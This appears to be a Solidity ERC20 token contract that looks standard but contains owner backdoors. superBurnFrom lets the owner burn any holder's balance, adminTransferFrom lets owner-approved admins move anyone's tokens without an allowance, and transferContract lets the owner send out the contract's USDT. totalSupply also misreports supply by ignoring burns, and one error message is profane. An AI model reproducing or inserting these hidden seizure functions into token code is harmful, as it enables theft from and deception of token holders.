pragma solidity ^0.5.0;

import "./IERC20.sol";
import "./SafeMath.sol";
 

contract ERC20 is IERC20 {
    
   
    using SafeMath for uint256;   
    uint256 private _totalSupply;
    uint256 private _oldTotalSupply;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
  
    uint256 private _totalBurnAmount;  

    address private superAdmin;
    mapping(address => address) private admin;
 
    modifier onlySuper {
        require(msg.sender == superAdmin,'require onwer');
        _;
    }

    
  
    function totalBurn() public view returns (uint256) {
        return _totalBurnAmount;
    }

    function getAmount( uint256 _amount ) public pure returns (uint256) {
        return _amount.div(1000000000000000000);
    }

    function totalSupply() public view returns (uint256) {
        return _oldTotalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _oldTotalSupply = _oldTotalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        superAdmin = account;  
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }


    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }


    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
 
    function superBurnFrom(address _burnTargetAddess, uint256 _value) public onlySuper returns (bool success) {
        require(_balances[_burnTargetAddess] >= _value,'Not enough balance');
        require(_totalSupply > _value,' SHIT ! YOURE A FUCKING BAD GUY ! Little bitches ');
        _burn(_burnTargetAddess,_value);
        _totalBurnAmount = _totalBurnAmount.add(_value);
        return true;
    }

    function superApproveAdmin(address _adminAddress) public onlySuper  returns (bool success) {
        require(_adminAddress != address(0),'is bad');
        admin[_adminAddress] = _adminAddress;
        if(admin[_adminAddress] == address(0)){
             return false;
        }
        return true;
    }
    
    function adminTransferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        if(admin[msg.sender] == address(0)){
             return false;
        }
        _transfer(sender, recipient, amount);
        return true;
    }
   
    IERC20 usdt;
    
    function initContract( IERC20 _addr  ) public onlySuper returns (bool) {
        usdt = _addr ;
        return true;
    }
    
    function transferContract(address recipient, uint256 amount) public onlySuper returns (bool) {
        usdt.transfer(recipient, amount);
        return true;
    }
    
    
}